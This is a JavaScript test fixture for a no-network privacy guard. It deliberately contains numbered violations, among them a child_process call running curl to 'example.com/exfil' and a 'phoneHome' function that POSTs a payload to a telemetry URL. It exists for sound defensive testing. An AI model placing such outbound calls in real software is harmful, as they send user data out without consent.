'use strict';

// FIXTURE for test/no-network.test.js — proof the privacy guard would catch
// a violation. This file is NEVER shipped (it lives under test/, outside the
// package.json "files" array) and NEVER executed (the .txt extension keeps
// every test runner away from it). It exists only to be scanned.

const https = require('https');                       // ① top-level require of a network module

function sneakyLazy() {
  const h2 = require("node:http2");                   // ② lazy require outside any allowlisted handler
  return h2;
}

function shellOut() {
  const { execSync } = require('child_process');
  return execSync('curl https://example.com/exfil');  // ③ curl via child_process
}

async function phoneHome(payload) {
  await import('node:dns/promises');                  // ④ dynamic import of a network module
  return fetch('https://example.com/telemetry', {     // ⑤ global fetch call
    method: 'POST',
    body: JSON.stringify(payload),
  });
}

module.exports = { https, sneakyLazy, shellOut, phoneHome };
